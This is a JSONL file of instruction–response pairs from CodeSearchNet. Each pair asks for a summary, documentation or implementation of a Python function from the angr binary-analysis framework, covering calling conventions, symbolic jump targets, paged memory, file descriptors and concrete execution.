{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef set_return_val(self, state, val, is_fp=None, size=None, stack_base=None):\n        ty = self.func_ty.returnty if self.func_ty is not None else None\n        try:\n            betterval = self._standardize_value(val, ty, state, None)\n        except AttributeError:\n            raise ValueError(\"Can't fit value %s into a return value\" % repr(val))\n\n        if self.ret_val is not None:\n            loc = self.ret_val\n        elif is_fp is not None:\n            loc = self.FP_RETURN_VAL if is_fp else self.RETURN_VAL\n        elif ty is not None:\n            loc = self.FP_RETURN_VAL if isinstance(ty, SimTypeFloat) else self.RETURN_VAL\n        else:\n            loc = self.FP_RETURN_VAL if self.is_fp_value(val) else self.RETURN_VAL\n\n        if loc is None:\n            raise NotImplementedError(\"This SimCC doesn't know how to store this value - should be implemented\")\n        loc.set_value(state, betterval, endness='Iend_BE', stack_base=stack_base)", "response": "Set the return value into the given state"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfinding the most - fit calling convention and return the corresponding SimCC instance.", "response": "def find_cc(arch, args, sp_delta):\n        \"\"\"\n        Pinpoint the best-fit calling convention and return the corresponding SimCC instance, or None if no fit is\n        found.\n\n        :param Arch arch:       An ArchX instance. Can be obtained from archinfo.\n        :param list args:       A list of arguments.\n        :param int sp_delta:    The change of stack pointer before and after the call is made.\n        :return:                A calling convention instance, or None if none of the SimCC subclasses seems to fit the\n                                arguments provided.\n        :rtype:                 SimCC or None\n        \"\"\"\n        if arch.name not in CC:\n            return None\n        possible_cc_classes = CC[arch.name]\n        for cc_cls in possible_cc_classes:\n            if cc_cls._match(arch, args, sp_delta):\n                return cc_cls(arch, args=args, sp_delta=sp_delta)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_arg_info(self, state, is_fp=None, sizes=None):\n        argument_types = self.func_ty.args\n        argument_names = self.func_ty.arg_names if self.func_ty.arg_names else ['unknown'] * len(self.func_ty.args)\n        argument_locations = self.arg_locs(is_fp=is_fp, sizes=sizes)\n        argument_values = self.get_args(state, is_fp=is_fp, sizes=sizes)\n        return list(zip(argument_types, argument_names, argument_locations, argument_values))", "response": "This method returns the information from various locations\n        is_fp and sizes are passed to self. get_args and returns the information of the nth argument in the list"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef add_successor(self, state, target, guard, jumpkind, add_guard=True, exit_stmt_idx=None, exit_ins_addr=None,\n                      source=None):\n        \"\"\"\n        Add a successor state of the SimRun.\n        This procedure stores method parameters into state.scratch, does some housekeeping,\n        and calls out to helper functions to prepare the state and categorize it into the appropriate\n        successor lists.\n\n        :param SimState state:    The successor state.\n        :param target:            The target (of the jump/call/ret).\n        :param guard:             The guard expression.\n        :param str jumpkind:      The jumpkind (call, ret, jump, or whatnot).\n        :param bool add_guard:    Whether to add the guard constraint (default: True).\n        :param int exit_stmt_idx: The ID of the exit statement, an integer by default. 'default'\n                                  stands for the default exit, and None means it's not from a\n                                  statement (for example, from a SimProcedure).\n        :param int exit_ins_addr: The instruction pointer of this exit, which is an integer by default.\n        :param int source:        The source of the jump (i.e., the address of the basic block).\n        \"\"\"\n\n        # First, trigger the SimInspect breakpoint\n        state._inspect('exit', BP_BEFORE, exit_target=target, exit_guard=guard, exit_jumpkind=jumpkind)\n        state.scratch.target = state._inspect_getattr(\"exit_target\", target)\n        state.scratch.guard = state._inspect_getattr(\"exit_guard\", guard)\n        state.history.jumpkind = state._inspect_getattr(\"exit_jumpkind\", jumpkind)\n        state.history.jump_target = state.scratch.target\n        state.history.jump_guard = state.scratch.guard\n\n        # track some vex-specific stuff here for now\n        state.scratch.source = source if source is not None else self.addr\n        state.scratch.exit_stmt_idx = exit_stmt_idx\n        state.scratch.exit_ins_addr = exit_ins_addr\n\n        self._preprocess_successor(state, add_guard=add_guard)\n\n        if state.history.jumpkind == 'Ijk_SigFPE_IntDiv' and o.PRODUCE_ZERODIV_SUCCESSORS not in state.options:\n            return\n\n        self._categorize_successor(state)\n        state._inspect('exit', BP_AFTER, exit_target=target, exit_guard=guard, exit_jumpkind=jumpkind)\n        if state.supports_inspect:\n            state.inspect.downsize()", "response": "Add a successor state to the state."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _categorize_successor(self, state):\n\n        self.all_successors.append(state)\n        target = state.scratch.target\n\n        # categorize the state\n        if o.APPROXIMATE_GUARDS in state.options and state.solver.is_false(state.scratch.guard, exact=False):\n            if o.VALIDATE_APPROXIMATIONS in state.options:\n                if state.satisfiable():\n                    raise Exception('WTF')\n            self.unsat_successors.append(state)\n        elif o.APPROXIMATE_SATISFIABILITY in state.options and not state.solver.satisfiable(exact=False):\n            if o.VALIDATE_APPROXIMATIONS in state.options:\n                if state.solver.satisfiable():\n                    raise Exception('WTF')\n            self.unsat_successors.append(state)\n        elif not state.scratch.guard.symbolic and state.solver.is_false(state.scratch.guard):\n            self.unsat_successors.append(state)\n        elif o.LAZY_SOLVES not in state.options and not state.satisfiable():\n            self.unsat_successors.append(state)\n        elif o.NO_SYMBOLIC_JUMP_RESOLUTION in state.options and state.solver.symbolic(target):\n            self.unconstrained_successors.append(state)\n        elif not state.solver.symbolic(target) and not state.history.jumpkind.startswith(\"Ijk_Sys\"):\n            # a successor with a concrete IP, and it's not a syscall\n            self.successors.append(state)\n            self.flat_successors.append(state)\n        elif state.history.jumpkind.startswith(\"Ijk_Sys\"):\n            # syscall\n            self.successors.append(state)\n\n            # Misuse the ip_at_syscall register to save the return address for this syscall\n            # state.ip *might be* changed to be the real address of syscall SimProcedures by syscall handling code in\n            # angr\n            state.regs.ip_at_syscall = state.ip\n\n            try:\n                symbolic_syscall_num, concrete_syscall_nums = self._resolve_syscall(state)\n                if concrete_syscall_nums is not None:\n                    for i, n in enumerate(concrete_syscall_nums):\n                        split_state = state if i == len(concrete_syscall_nums) - 1 else state.copy()\n                        split_state.add_constraints(symbolic_syscall_num == n)\n                        if split_state.supports_inspect:\n                            split_state.inspect.downsize()\n                        self._fix_syscall_ip(split_state)\n\n                        self.flat_successors.append(split_state)\n                else:\n                    # We cannot resolve the syscall number\n                    # However, we still put it to the flat_successors list, and angr.SimOS.handle_syscall will pick it\n                    # up, and create a \"unknown syscall\" stub for it.\n                    self._fix_syscall_ip(state)\n                    self.flat_successors.append(state)\n            except AngrUnsupportedSyscallError:\n                self.unsat_successors.append(state)\n\n        else:\n            # a successor with a symbolic IP\n            _max_targets = state.options.symbolic_ip_max_targets\n            _max_jumptable_targets = state.options.jumptable_symbolic_ip_max_targets\n            try:\n                if o.NO_IP_CONCRETIZATION in state.options:\n                    # Don't try to concretize the IP\n                    cond_and_targets = [ (claripy.true, target) ]\n                    max_targets = 0\n                elif o.KEEP_IP_SYMBOLIC in state.options:\n                    s = claripy.Solver()\n                    addrs = s.eval(target, _max_targets + 1, extra_constraints=tuple(state.ip_constraints))\n                    if len(addrs) > _max_targets:\n                        # It is not a library\n                        l.debug(\"It is not a Library\")\n                        addrs = state.solver.eval_upto(target, _max_targets + 1)\n                        l.debug(\"addrs :%s\", addrs)\n                    cond_and_targets = [ (target == addr, addr) for addr in addrs ]\n                    max_targets = _max_targets\n                else:\n                    cond_and_targets = self._eval_target_jumptable(state, target, _max_jumptable_targets + 1)\n                    if cond_and_targets is None:\n                        # Fallback to the traditional and slow method\n                        cond_and_targets = self._eval_target_brutal(state, target, _max_targets + 1)\n                        max_targets = _max_targets\n                    else:\n                        max_targets = _max_jumptable_targets\n\n                if len(cond_and_targets) > max_targets:\n                    l.warning(\n                        \"Exit state has over %d possible solutions. Likely unconstrained; skipping. %s\",\n                        max_targets,\n                        target.shallow_repr()\n                    )\n                    self.unconstrained_successors.append(state)\n                else:\n                    for cond, a in cond_and_targets:\n                        split_state = state.copy()\n                        if o.KEEP_IP_SYMBOLIC in split_state.options:\n                            split_state.regs.ip = target\n                        else:\n                            split_state.add_constraints(cond, action=True)\n                            split_state.regs.ip = a\n                        if split_state.supports_inspect:\n                            split_state.inspect.downsize()\n                        self.flat_successors.append(split_state)\n                    self.successors.append(state)\n            except SimSolverModeError:\n                self.unsat_successors.append(state)\n\n        return state", "response": "Add the state to the list of successors and the successors."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nresolving syscall information from the state and set the IP of the state accordingly.", "response": "def _fix_syscall_ip(state):\n        \"\"\"\n        Resolve syscall information from the state, get the IP address of the syscall SimProcedure, and set the IP of\n        the state accordingly. Don't do anything if the resolution fails.\n\n        :param SimState state: the program state.\n        :return: None\n        \"\"\"\n\n        try:\n            bypass = o.BYPASS_UNSUPPORTED_SYSCALL in state.options\n            stub = state.project.simos.syscall(state, allow_unsupported=bypass)\n            if stub: # can be None if simos is not a subclass of SimUserspace\n                state.ip = stub.addr # fix the IP\n        except AngrUnsupportedSyscallError:\n            pass"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nevaluate symbolic jump targets.", "response": "def _eval_target_jumptable(state, ip, limit):\n        \"\"\"\n        A *very* fast method to evaluate symbolic jump targets if they are a) concrete targets, or b) targets coming\n        from jump tables.\n\n        :param state:   A SimState instance.\n        :param ip:      The AST of the instruction pointer to evaluate.\n        :param limit:   The maximum number of concrete IPs.\n        :return:        A list of conditions and the corresponding concrete IPs, or None which indicates fallback is\n                        necessary.\n        :rtype:         list or None\n        \"\"\"\n\n        if ip.symbolic is False:\n            return [ (claripy.ast.bool.true, ip) ]  # concrete\n\n        # Detect whether ip is in the form of \"if a == 1 then addr_0 else if a == 2 then addr_1 else ...\"\n        cond_and_targets = [ ]  # tuple of (condition, target)\n\n        ip_ = ip\n        # Handle the outer Reverse\n        outer_reverse = False\n        if ip_.op == \"Reverse\":\n            ip_ = ip_.args[0]\n            outer_reverse = True\n\n        fallback = False\n        target_variable = None\n        concretes = set()\n        reached_sentinel = False\n\n        for cond, target in claripy.reverse_ite_cases(ip_):\n            # We must fully unpack the entire AST to make sure it indeed complies with the form above\n            if reached_sentinel:\n                # We should not have any other value beyond the sentinel - maybe one of the possible targets happens to\n                # be the same as the sentinel value?\n                fallback = True\n                break\n\n            if target.symbolic is False and state.solver.eval(target) == DUMMY_SYMBOLIC_READ_VALUE:\n                # Ignore the dummy value, which acts as the sentinel of this ITE tree\n                reached_sentinel = True\n                continue\n\n            if cond.op != \"__eq__\":\n                # We only support equivalence right now. Fallback\n                fallback = True\n                break\n\n            if cond.args[0].symbolic is True and cond.args[1].symbolic is False:\n                variable, value = cond.args\n            elif cond.args[0].symbolic is False and cond.args[1].symbolic is True:\n                value, variable = cond.args\n            else:\n                # Cannot determine variable and value. Fallback\n                fallback = True\n                break\n\n            if target_variable is None:\n                target_variable = variable\n            elif target_variable is not variable:\n                # it's checking a different variable. Fallback\n                fallback = True\n                break\n\n            # Make sure the conditions are mutually exclusive\n            value_concrete = state.solver.eval(value)\n            if value_concrete in concretes:\n                # oops... the conditions are not mutually exclusive\n                fallback = True\n                break\n            concretes.add(value_concrete)\n\n            if target.symbolic is True:\n                # Cannot handle symbolic targets. Fallback\n                fallback = True\n                break\n\n            cond_and_targets.append((cond, target if not outer_reverse else state.solver.Reverse(target)))\n\n        if reached_sentinel is False:\n            # huh?\n            fallback = True\n\n        if fallback:\n            return None\n        else:\n            return cond_and_targets[ : limit]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _repeat_bytes(byt, rep):\n\n        if rep == 1:\n            return byt\n\n        remainder = rep % 2\n        quotient = rep // 2\n\n        r_ = memset._repeat_bytes(byt, quotient)\n        if remainder == 1:\n            r = r_ << ((quotient + 1) * 8)\n            r |= (r_ << 8) + byt\n        else:\n            r = r_ << (quotient * 8)\n            r |= r_\n        return r", "response": "This function is used to get a long number for a byte being repeated for many times."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef copy(self):\n        s = MemoryData(self.address, self.size, self.sort, pointer_addr=self.pointer_addr, max_size=self.max_size)\n        s.content = self.content\n\n        return s", "response": "Make a copy of the MemoryData instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef store_mo(self, state, new_mo, overwrite=True): #pylint:disable=unused-argument\n        start, end = self._resolve_range(new_mo)\n        if overwrite:\n            self.store_overwrite(state, new_mo, start, end)\n        else:\n            self.store_underwrite(state, new_mo, start, end)", "response": "Stores a memory object in the state."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef load_mo(self, state, page_idx):\n\n        try:\n            key = next(self._storage.irange(maximum=page_idx, reverse=True))\n        except StopIteration:\n            return None\n        else:\n            return self._storage[key]", "response": "Load a memory object from memory."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nload the slice of the memory.", "response": "def load_slice(self, state, start, end):\n        \"\"\"\n        Return the memory objects overlapping with the provided slice.\n\n        :param start: the start address\n        :param end: the end address (non-inclusive)\n        :returns: tuples of (starting_addr, memory_object)\n        \"\"\"\n        keys = list(self._storage.irange(start, end-1))\n        if not keys or keys[0] != start:\n            try:\n                key = next(self._storage.irange(maximum=start, reverse=True))\n            except StopIteration:\n                pass\n            else:\n                if self._storage[key].includes(start):\n                    keys.insert(0, key)\n        return [(max(start, key), self._storage[key]) for key in keys]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads a memory object from memory.", "response": "def load_mo(self, state, page_idx):\n        \"\"\"\n        Loads a memory object from memory.\n\n        :param page_idx: the index into the page\n        :returns: a tuple of the object\n        \"\"\"\n        mo = self._storage[page_idx-self._page_addr]\n        return self._sinkhole if mo is None else mo"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef load_slice(self, state, start, end):\n        items = [ ]\n        if start > self._page_addr + self._page_size or end < self._page_addr:\n            l.warning(\"Calling load_slice on the wrong page.\")\n            return items\n\n        for addr in range(max(start, self._page_addr), min(end, self._page_addr + self._page_size)):\n            i = addr - self._page_addr\n            mo = self._storage[i]\n            if mo is None:\n                mo = self._sinkhole\n            if mo is not None and (not items or items[-1][1] is not mo):\n                items.append((addr, mo))\n        return items", "response": "Load the slice of memory objects from the memory."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef contains_no_backer(self, addr):\n\n        for i, p in self._pages.items():\n            if i * self._page_size <= addr < (i + 1) * self._page_size:\n                return addr - (i * self._page_size) in p.keys()\n        return False", "response": "Tests if the address is contained in any page of paged memory without considering memory backers."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the set of changed bytes between self and other.", "response": "def __changed_bytes(self, other):\n        \"\"\"\n        Gets the set of changed bytes between `self` and `other`.\n\n        :type other:    SimPagedMemory\n        :returns:       A set of differing bytes.\n        \"\"\"\n        if self._page_size != other._page_size:\n            raise SimMemoryError(\"SimPagedMemory page sizes differ. This is asking for disaster.\")\n\n        our_pages = set(self._pages.keys())\n        their_pages = set(other._pages.keys())\n        their_additions = their_pages - our_pages\n        our_additions = our_pages - their_pages\n        common_pages = our_pages & their_pages\n\n        candidates = set()\n        for p in their_additions:\n            candidates.update(other._pages[p].keys())\n        for p in our_additions:\n            candidates.update(self._pages[p].keys())\n\n        for p in common_pages:\n            our_page = self._pages[p]\n            their_page = other._pages[p]\n\n            if our_page is their_page:\n                continue\n\n            our_keys = set(our_page.keys())\n            their_keys = set(their_page.keys())\n            changes = (our_keys - their_keys) | (their_keys - our_keys) | {\n                i for i in (our_keys & their_keys) if our_page.load_mo(self.state, i) is not their_page.load_mo(self.state, i)\n            }\n            candidates.update(changes)\n\n        #both_changed = our_changes & their_changes\n        #ours_changed_only = our_changes - both_changed\n        #theirs_changed_only = their_changes - both_changed\n        #both_deleted = their_deletions & our_deletions\n        #ours_deleted_only = our_deletions - both_deleted\n        #theirs_deleted_only = their_deletions - both_deleted\n\n        differences = set()\n        for c in candidates:\n            if c not in self and c in other:\n                differences.add(c)\n            elif c in self and c not in other:\n                differences.add(c)\n            else:\n                if type(self[c]) is not SimMemoryObject:\n                    self[c] = SimMemoryObject(self.state.solver.BVV(ord(self[c]), self.byte_width), c, byte_width=self.byte_width)\n                if type(other[c]) is not SimMemoryObject:\n                    other[c] = SimMemoryObject(self.state.solver.BVV(ord(other[c]), self.byte_width), c, byte_width=self.byte_width)\n                if c in self and self[c] != other[c]:\n                    # Try to see if the bytes are equal\n                    self_byte = self[c].bytes_at(c, 1)\n                    other_byte = other[c].bytes_at(c, 1)\n                    if self_byte is not other_byte:\n                        #l.debug(\"%s: offset %x, two different bytes %s %s from %s %s\", self.id, c,\n                        #        self_byte, other_byte,\n                        #        self[c].object.model, other[c].object.model)\n                        differences.add(c)\n                else:\n                    # this means the byte is in neither memory\n                    pass\n\n        return differences"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nwrite a memory object to a page.", "response": "def _apply_object_to_page(self, page_base, mo, page=None, overwrite=True):\n        \"\"\"\n        Writes a memory object to a `page`\n\n        :param page_base:   The base address of the page.\n        :param mo:          The memory object.\n        :param page:        (optional) the page to use.\n        :param overwrite:   (optional) If False, only write to currently-empty memory.\n        \"\"\"\n        page_num = page_base // self._page_size\n        try:\n            page = self._get_page(page_num,\n                                  write=True,\n                                  create=not self.allow_segv) if page is None else page\n        except KeyError:\n            if self.allow_segv:\n                raise SimSegfaultError(mo.base, 'write-miss')\n            else:\n                raise\n        if self.allow_segv and not page.concrete_permissions & Page.PROT_WRITE:\n            raise SimSegfaultError(mo.base, 'non-writable')\n\n        page.store_mo(self.state, mo, overwrite=overwrite)\n        return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nstores the memory object in the memory store.", "response": "def store_memory_object(self, mo, overwrite=True):\n        \"\"\"\n        This function optimizes a large store by storing a single reference to the :class:`SimMemoryObject` instead of\n        one for each byte.\n\n        :param memory_object: the memory object to store\n        \"\"\"\n\n        for p in self._containing_pages_mo(mo):\n            self._apply_object_to_page(p, mo, overwrite=overwrite)\n\n        self._update_range_mappings(mo.base, mo.object, mo.length)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef replace_memory_object(self, old, new_content):\n\n        if old.object.size() != new_content.size():\n            raise SimMemoryError(\"memory objects can only be replaced by the same length content\")\n\n        new = SimMemoryObject(new_content, old.base, byte_width=self.byte_width)\n        for p in self._containing_pages_mo(old):\n            self._get_page(p//self._page_size, write=True).replace_mo(self.state, old, new)\n\n        if isinstance(new.object, claripy.ast.BV):\n            for b in range(old.base, old.base+old.length):\n                self._update_mappings(b, new.object)\n        return new", "response": "Replaces the memory object old with a new memory object containing new_content."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreplaces all instances of expression old with expression new.", "response": "def replace_all(self, old, new):\n        \"\"\"\n        Replaces all instances of expression `old` with expression `new`.\n\n        :param old: A claripy expression. Must contain at least one named variable (to make it possible to use the\n                    name index for speedup).\n        :param new: The new variable to replace it with.\n        \"\"\"\n\n        if options.REVERSE_MEMORY_NAME_MAP not in self.state.options:\n            raise SimMemoryError(\"replace_all is not doable without a reverse name mapping. Please add \"\n                                 \"sim_options.REVERSE_MEMORY_NAME_MAP to the state options\")\n\n        if not isinstance(old, claripy.ast.BV) or not isinstance(new, claripy.ast.BV):\n            raise SimMemoryError(\"old and new arguments to replace_all() must be claripy.BV objects\")\n\n        if len(old.variables) == 0:\n            raise SimMemoryError(\"old argument to replace_all() must have at least one named variable\")\n\n        # Compute an intersection between sets of memory objects for each unique variable name. The eventual memory\n        # object set contains all memory objects that we should update.\n        memory_objects = None\n        for v in old.variables:\n            if memory_objects is None:\n                memory_objects = self.memory_objects_for_name(v)\n            elif len(memory_objects) == 0:\n                # It's a set and it's already empty\n                # there is no way for it to go back...\n                break\n            else:\n                memory_objects &= self.memory_objects_for_name(v)\n\n        replaced_objects_cache = { }\n        for mo in memory_objects:\n            replaced_object = None\n\n            if mo.object in replaced_objects_cache:\n                if mo.object is not replaced_objects_cache[mo.object]:\n                    replaced_object = replaced_objects_cache[mo.object]\n\n            else:\n                replaced_object = mo.object.replace(old, new)\n                replaced_objects_cache[mo.object] = replaced_object\n                if mo.object is replaced_object:\n                    # The replace does not really occur\n                    replaced_object = None\n\n            if replaced_object is not None:\n                self.replace_memory_object(mo, replaced_object)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a generator of addresses that contain expressions that contain a variable named n.", "response": "def addrs_for_name(self, n):\n        \"\"\"\n        Returns addresses that contain expressions that contain a variable named `n`.\n        \"\"\"\n        if n not in self._name_mapping:\n            return\n\n        self._mark_updated_mapping(self._name_mapping, n)\n\n        to_discard = set()\n        for e in self._name_mapping[n]:\n            try:\n                if n in self[e].object.variables: yield e\n                else: to_discard.add(e)\n            except KeyError:\n                to_discard.add(e)\n        self._name_mapping[n] -= to_discard"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list of addresses that contain expressions that contain a variable with the hash h.", "response": "def addrs_for_hash(self, h):\n        \"\"\"\n        Returns addresses that contain expressions that contain a variable with the hash of `h`.\n        \"\"\"\n        if h not in self._hash_mapping:\n            return\n\n        self._mark_updated_mapping(self._hash_mapping, h)\n\n        to_discard = set()\n        for e in self._hash_mapping[h]:\n            try:\n                if h == hash(self[e].object): yield e\n                else: to_discard.add(e)\n            except KeyError:\n                to_discard.add(e)\n        self._hash_mapping[h] -= to_discard"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_fd(self, fd):\n        try:\n            fd = self.state.solver.eval_one(fd)\n        except SimSolverError:\n            ideal = self._pick_fd()\n            self.state.solver.add(fd == ideal)\n            if not self.state.solver.satisfiable():\n                raise SimPosixError(\"Tried to do operation on symbolic but partially constrained file descriptor\")\n            fd = ideal\n            new_filename = b'/tmp/angr_implicit_%d' % self.autotmp_counter\n            l.warning(\"Tried to look up a symbolic fd - constrained to %d and opened %s\", ideal, new_filename)\n            self.autotmp_counter += 1\n            if self.open(new_filename, Flags.O_RDWR, preferred_fd=fd) != fd:\n                raise SimPosixError(\"Something went wrong trying to open implicit temp\")\n\n        return self.fd.get(fd)", "response": "Returns the SimFileDescriptor associated with the given number."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef close(self, fd):\n        try:\n            fd = self.state.solver.eval_one(fd)\n        except SimSolverError:\n            l.error(\"Trying to close a symbolic file descriptor\")\n            return False\n\n        if fd not in self.fd:\n            l.info(\"Trying to close an unopened file descriptor\")\n            return False\n\n        self.state.history.add_event('fs_close', fd=fd, close_idx=len(self.closed_fds))\n        self.closed_fds.append((fd, self.fd[fd]))\n\n        del self.fd[fd]\n        return True", "response": "Closes the given file descriptor. Returns True if the operation succeeded."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets the current sigmask.", "response": "def sigmask(self, sigsetsize=None):\n        \"\"\"\n        Gets the current sigmask. If it's blank, a new one is created (of sigsetsize).\n\n        :param sigsetsize: the size (in *bytes* of the sigmask set)\n        :return: the sigmask\n        \"\"\"\n        if self._sigmask is None:\n            if sigsetsize is not None:\n                sc = self.state.solver.eval(sigsetsize)\n                self.state.add_constraints(sc == sigsetsize)\n                self._sigmask = self.state.solver.BVS('initial_sigmask', sc*self.state.arch.byte_width, key=('initial_sigmask',), eternal=True)\n            else:\n                self._sigmask = self.state.solver.BVS('initial_sigmask', self.sigmask_bits, key=('initial_sigmask',), eternal=True)\n        return self._sigmask"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef sigprocmask(self, how, new_mask, sigsetsize, valid_ptr=True):\n        oldmask = self.sigmask(sigsetsize)\n        self._sigmask = self.state.solver.If(valid_ptr,\n            self.state.solver.If(how == self.SIG_BLOCK,\n                oldmask | new_mask,\n                self.state.solver.If(how == self.SIG_UNBLOCK,\n                    oldmask & (~new_mask),\n                    self.state.solver.If(how == self.SIG_SETMASK,\n                        new_mask,\n                        oldmask\n                     )\n                )\n            ),\n            oldmask\n        )", "response": "Updates the signal mask."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndumps a file by path.", "response": "def dump_file_by_path(self, path, **kwargs):\n        \"\"\"\n        Returns the concrete content for a file by path.\n\n        :param path: file path as string\n        :param kwargs: passed to state.solver.eval\n        :return: file contents as string\n        \"\"\"\n        file = self.state.fs.get(path)\n        if file is None:\n            return None\n        return file.concretize(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndumps the concrete content for a file descriptor.", "response": "def dumps(self, fd, **kwargs):\n        \"\"\"\n        Returns the concrete content for a file descriptor.\n\n        BACKWARD COMPATIBILITY: if you ask for file descriptors 0 1 or 2, it will return the data from stdin, stdout,\n        or stderr as a flat string.\n\n        :param fd:  A file descriptor.\n        :return:    The concrete content.\n        :rtype:     str\n        \"\"\"\n        if 0 <= fd <= 2:\n            data = [self.stdin, self.stdout, self.stderr][fd].concretize(**kwargs)\n            if type(data) is list:\n                data = b''.join(data)\n            return data\n        return self.get_fd(fd).concretize(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nhandling the concrete execution of the process This method takes care of: 1- Set the breakpoints on the addresses provided by the user 2- Concretize the symbolic variables and perform the write inside the concrete process 3- Continue the program execution. :param state: The state with which to execute :param extra_stop_points: list of a addresses where to stop the concrete execution and return to the simulated one :param concretize: list of tuples (address, symbolic variable) that are going to be written in the concrete process memory :param timeout: how long we should wait the concrete target to reach the breakpoint :return: None", "response": "def to_engine(self, state, extra_stop_points, concretize, timeout):\n        \"\"\"\n        Handle the concrete execution of the process\n        This method takes care of:\n        1- Set the breakpoints on the addresses provided by the user\n        2- Concretize the symbolic variables and perform the write inside the concrete process\n        3- Continue the program execution.\n\n        :param state:               The state with which to execute\n        :param extra_stop_points:   list of a addresses where to stop the concrete execution and return to the\n                                    simulated one\n        :param concretize:          list of tuples (address, symbolic variable) that are going to be written\n                                    in the concrete process memory\n        :param timeout:             how long we should wait the concrete target to reach the breakpoint\n        :return: None\n        \"\"\"\n\n        state.timeout = False\n        state.errored = False\n        extra_stop_points = [] if extra_stop_points is None else extra_stop_points\n\n        l.debug(\"Entering in SimEngineConcrete: simulated address %#x concrete address %#x stop points %s\",\n                state.addr, self.target.read_register(\"pc\"), map(hex, extra_stop_points))\n\n        if concretize:\n            l.debug(\"SimEngineConcrete is concretizing variables before resuming the concrete process\")\n\n            for sym_var in concretize:\n                sym_var_address = state.solver.eval(sym_var[0])\n                sym_var_value = state.solver.eval(sym_var[1], cast_to=bytes)\n                l.debug(\"Concretize memory at address %#x with value %s\", sym_var_address, str(sym_var_value))\n                self.target.write_memory(sym_var_address, sym_var_value, raw=True)\n\n        # Set breakpoint on remote target\n        for stop_point in extra_stop_points:\n            l.debug(\"Setting breakpoints at %#x\", stop_point)\n            self.target.set_breakpoint(stop_point, temporary=True)\n\n        if timeout > 0:\n            l.debug(\"Found timeout as option, setting it up!\")\n\n            def timeout_handler():\n                self.target.stop()    # stop the concrete target now!\n                state.timeout = True  # this will end up in the timeout stash\n\n            execution_timer = threading.Timer(timeout, timeout_handler)\n            execution_timer.start()  # start the timer!\n\n        # resuming of the concrete process, if the target won't reach the\n        # breakpoint specified by the user the timeout will abort angr execution.\n        l.debug(\"SimEngineConcrete is resuming the concrete process\")\n        self.target.run()\n        l.debug(\"SimEngineConcrete has successfully resumed the process\")\n\n        if state.timeout:\n            l.critical(\"Timeout has been reached during resuming of concrete process\")\n            l.critical(\"This can be a bad thing ( the ConcreteTarget didn't hit your breakpoint ) or\"\n                       \"just it will take a while.\")\n\n        # reset the alarm\n        if timeout > 0:\n            execution_timer.cancel()\n\n        # removing all breakpoints set by the concrete target\n        for stop_point in extra_stop_points:\n            self.target.remove_breakpoint(stop_point)\n\n        # handling the case in which the program stops at a point different than the breakpoints set\n        # by the user.\n        current_pc = self.target.read_register(\"pc\")\n        if current_pc not in extra_stop_points and not self.target.timeout:\n            l.critical(\"Stopped at unexpected location inside the concrete process: %#x\", current_pc)\n            raise AngrError"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef check_concrete_target_methods(concrete_target):\n        entry_point = concrete_target.read_register(\"pc\")\n        if not type(entry_point) is int:\n            l.error(\"read_register result type is %s, should be <type 'int'>\", (type(entry_point)))\n            return False\n\n        mem_read = concrete_target.read_memory(entry_point, 0x4)\n\n        if not type(mem_read) is bytes:\n            l.error(\"read_memory result type is %s, should be <type 'bytes'>\", (type(mem_read)))\n            return False\n\n        try:\n            concrete_target.read_register(\"not_existent_reg\")\n            l.error(\"read_register should raise a SimConcreteRegisterError when accessing non existent registers\")\n            return False\n\n        except SimConcreteRegisterError:\n            l.debug(\"read_register raise a SimConcreteRegisterError, ok!\")\n\n        try:\n            concrete_target.read_memory(0x0, 0x4)\n            l.error(\"read_memory should raise a SimConcreteMemoryError when accessing non mapped memory\")\n            return False\n\n        except SimConcreteMemoryError:\n            l.debug(\"read_register raise a SimConcreteMemoryError, ok!\")\n\n        return True", "response": "Check if the concrete target methods return the correct type of data\n           "}
